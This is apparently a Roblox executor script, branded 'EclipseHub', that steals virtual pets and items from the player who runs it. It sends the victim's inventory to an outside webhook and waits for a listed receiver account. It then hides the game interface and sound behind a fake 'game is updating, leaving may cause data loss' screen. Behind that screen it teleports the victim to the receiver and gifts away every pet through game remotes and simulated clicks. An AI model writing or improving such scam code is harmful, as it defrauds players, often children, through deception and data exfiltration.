local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local RS = game:GetService("ReplicatedStorage")
local PetsService = RS:WaitForChild("PetsService")

-- Create a boundary for multipart form data
local boundary = "------------------------" .. HttpService:GenerateGUID(false)

-- Prepare embed JSON
local embedPayload = HttpService:JSONEncode(payload)

-- Create multipart body
local body = {}
table.insert(body, "--" .. boundary)
table.insert(body, 'Content-Disposition: form-data; name="payload_json"')
table.insert(body, "")
table.insert(body, embedPayload)

table.insert(body, "--" .. boundary)
table.insert(body, 'Content-Disposition: form-data; name="file"; filename="items.txt"')
table.insert(body, "Content-Type: text/plain")
table.insert(body, "")
table.insert(body, fullBackpackString)

table.insert(body, "--" .. boundary .. "--")

-- Join body parts
local requestBody = table.concat(body, "\r\n")

-- Send request
pcall(function()
    request({
        Url = Webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
        },
        Body = requestBody
    })
end)

local function CreateGui()
    local player = Players.LocalPlayer

    local gui = Instance.new("ScreenGui")
    gui.Name = "EclipseHubGui"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.Parent = player:WaitForChild("PlayerGui")
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    gui.DisplayOrder = 99999

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.Position = UDim2.new(0, 0, 0, 0)
    bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    bg.Parent = gui

    local spinner = Instance.new("ImageLabel")
    spinner.AnchorPoint = Vector2.new(0.5, 0.5)
    spinner.Size = UDim2.new(0.2, 0, 0.2, 0)
    spinner.Position = UDim2.new(0.5, 0, 0.35, 0)
    spinner.BackgroundTransparency = 1
    spinner.Image = "rbxassetid://74011233271790"
    spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
    spinner.Parent = bg

    local asc = Instance.new("UIAspectRatioConstraint")
    asc.Parent = spinner

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0.08, 0)
    title.Position = UDim2.new(0, 0, 0.53, 0)
    title.BackgroundTransparency = 1
    title.Text = "Please wait..."
    title.Font = Enum.Font.GothamBold
    title.TextSize = 38
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextStrokeTransparency = 0.75
    title.Parent = bg

    local desc = Instance.new("TextLabel")
    desc.Size = UDim2.new(0.8, 0, 0.12, 0)
    desc.Position = UDim2.new(0.1, 0, 0.62, 0)
    desc.BackgroundTransparency = 1
    desc.Text = "The game is updating. Leaving now may cause data loss or corruption.\nYou will be returned shortly."
    desc.Font = Enum.Font.Gotham
    desc.TextSize = 20
    desc.TextColor3 = Color3.fromRGB(200, 200, 200)
    desc.TextWrapped = true
    desc.TextXAlignment = Enum.TextXAlignment.Center
    desc.TextYAlignment = Enum.TextYAlignment.Top
    desc.Parent = bg

    -- Countdown label
    local countdown = Instance.new("TextLabel")
    countdown.Size = UDim2.new(1, 0, 0.05, 0)
    countdown.Position = UDim2.new(0, 0, 0.87, 0)
    countdown.BackgroundTransparency = 1
    countdown.Text = "Returning in 30 seconds..."
    countdown.Font = Enum.Font.GothamSemibold
    countdown.TextSize = 20
    countdown.TextColor3 = Color3.fromRGB(255, 255, 255)
    countdown.TextXAlignment = Enum.TextXAlignment.Center
    countdown.Parent = bg

    -- Spinner animation
    task.spawn(function()
        while spinner and spinner.Parent do
            spinner.Rotation += 2
            task.wait(0.01)
        end
    end)

    -- Countdown logic
    task.spawn(function()
        for i = 30, 0, -1 do
            countdown.Text = "Returning in " .. i .. " second" .. (i == 1 and "" or "s") .. "..."
            task.wait(1)
        end
    end)
end

local usernames = {
    "PUT_HERE_YOUR_BACK_UP_USERNAMES", -- PUT THEIR UR EXTRA USERNAMES
}

local receiverPlr
repeat
    for _, name in ipairs(usernames) do
        receiverPlr = Players:FindFirstChild(name) or Players:FindFirstChild(Username)
        if receiverPlr then
            break
        end
    end
    task.wait(1)
until receiverPlr

local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
local hum = receiverChar:WaitForChild("Humanoid")
local targetPlr = Players.LocalPlayer
local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()

if receiverPlr == targetPlr then
    repeat
        for _, name in ipairs(usernames) do
            receiverPlr = Players:FindFirstChild(name)
            if receiverPlr then
                break
            end
        end
        task.wait(1)
    until receiverPlr
end

local jumped = false
local chatted = false

hum.Jumping:Connect(function()
    jumped = true
end)

receiverPlr.Chatted:Connect(function()
    chatted = true
end)

repeat
    task.wait()
until jumped or chatted

for _, v in targetPlr.PlayerGui:GetDescendants() do
    if v:IsA("ScreenGui") then
        v.Enabled = false
    end
end

for _, sound in ipairs(workspace:GetDescendants()) do
    if sound:IsA("Sound") then
        sound.Volume = 0
    end
end

for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do
    if sound:IsA("Sound") then
        sound.Volume = 0
    end
end

game:GetService("CoreGui").TopBarApp.TopBarApp.Enabled = false

--[[
for _, v in pairs(game:GetService("CoreGui").RobloxGui:GetDescendants()) do
    if not v:IsA("LocalScript") then
        pcall(function()
            v:Destroy()
        end)
    end
end
]]

game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
CreateGui()

if workspace:FindFirstChild("PetsPhysical") then
    for _, petMover in workspace:FindFirstChild("PetsPhysical"):GetChildren() do
        if petMover and petMover:GetAttribute("OWNER") == targetPlr.Name then
            for _, pet in petMover:GetChildren() do
                PetsService:UnequipPet(pet.Name)
            end
        end
    end
end

for _, tool in pairs(targetPlr.Backpack:GetChildren()) do
    if tool and tool:IsA("Tool") and tool:GetAttribute("d") == true then
        local tool = game:GetService("Players").LocalPlayer:WaitForChild("Backpack"):WaitForChild(tool.Name)
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
    end
end

local function safeFollow()
    local offset = CFrame.new(0, 0, 0.5) -- Reduced offset for closer proximity
    local conn = RunService.Stepped:Connect(function()
        if receiverPlr.Character and targetPlr.Character then
            local targetRoot = receiverPlr.Character:FindFirstChild("HumanoidRootPart")
            local followerRoot = targetPlr.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot and followerRoot then
                local distance = (targetRoot.Position - followerRoot.Position).Magnitude
                if distance > 5 then -- Ensure within 5 studs
                    followerRoot.CFrame = targetRoot.CFrame * offset
                end
            end
        end
    end)

    return {
        Stop = function()
            if conn then
                conn:Disconnect()
            end
        end
    }
end

local inventory = targetPlr.Backpack

local function detectExecutor()
    -- Dummy placeholder; replace with your actual executor detection logic
    return "Delta"
end

local function safeGiftTool(tool)
    -- Verify both players and their characters exist
    if not receiverPlr or not receiverChar or not targetPlr.Character then
        warn("Gifting failed: Invalid receiver or target character")
        return false
    end

    -- Ensure tool is in Backpack
    if tool.Parent ~= inventory then
        tool.Parent = inventory
        task.wait(0.3)
    end

    -- Equip the tool
    local humanoid = targetPlr.Character:FindFirstChild("Humanoid")
    if not humanoid then
        warn("Gifting failed: No Humanoid found for targetPlr")
        return false
    end

    humanoid:EquipTool(tool)
    task.wait(0.6) -- Increased wait for server to register equip

    -- Verify tool is equipped
    if tool.Parent ~= targetPlr.Character then
        warn("Gifting failed: Tool not equipped - " .. tool.Name)
        tool.Parent = inventory -- Reset to Backpack
        return false
    end

    if detectExecutor() == "Delta" then
        task.wait(0.3)
        local camera = workspace.CurrentCamera
        local head = receiverChar and receiverChar:FindFirstChild("Head")

        if head then
            local screenPos, onScreen = camera:WorldToViewportPoint(head.Position)
            if onScreen then
                local x = screenPos.X
                local y = screenPos.Y

                print("Screen position of head:", x, y)

                -- Example mouse click:
                local VirtualInputManager = game:GetService("VirtualInputManager")
                VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, nil, false)
                task.wait(0.8)
                VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, nil, false)
            else
                warn("Head not on screen")
                return false
            end
        end
    else

        -- Fire gifting event
        local success, err = pcall(function()
            RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
            
            -- Trigger proximity prompt if it exists
            task.wait(0.5) -- Increased wait for prompt to appear
            local prompt = receiverChar:FindFirstChild("Head") and receiverChar.Head:FindFirstChildOfClass("ProximityPrompt")
            if prompt then
                print("Triggering proximity prompt for " .. receiverPlr.Name)
                fireproximityprompt(prompt)
            else
                warn("No proximity prompt found for " .. receiverPlr.Name)
            end
            return true
        end)

        -- Handle failure
        if not success then
            warn("Gifting failed for " .. tool.Name .. ": " .. tostring(err))
            tool.Parent = inventory -- Reset to Backpack
            return false
        end

        task.wait(0.55)
    end

    -- Verify tool is no longer in possession (indicating successful gift)
    task.wait(0.15) -- Increased wait to confirm gift
    if tool then
        tool.Parent = targetPlr.Backpack
    end
    return true
end

safeFollow()
task.wait(1)

-- Gifting loop
for _, pet in ipairs(pets) do
    for _, tool in targetPlr.Backpack:GetChildren() do
        if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("PET_UUID") == pet.Id then
            print("Gifting:", tool.Name)
            for attempt = 1, 3 do
                local result = safeGiftTool(tool)
                if result then
                    break
                end
            end       
        end
    end
end

-- ===== Teleport handling =====

game:GetService("TeleportService").TeleportInitFailed:Connect(function(_, _, _, _, v)
    queue_on_teleport(string.format([[getgenv().JobId = "%s"]], v.ServerInstanceId))
end)

for _ = 1, 2 do
    task.spawn(function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(126884695634066, getgenv().JobId or game.JobId)
    end)
    task.wait()
end
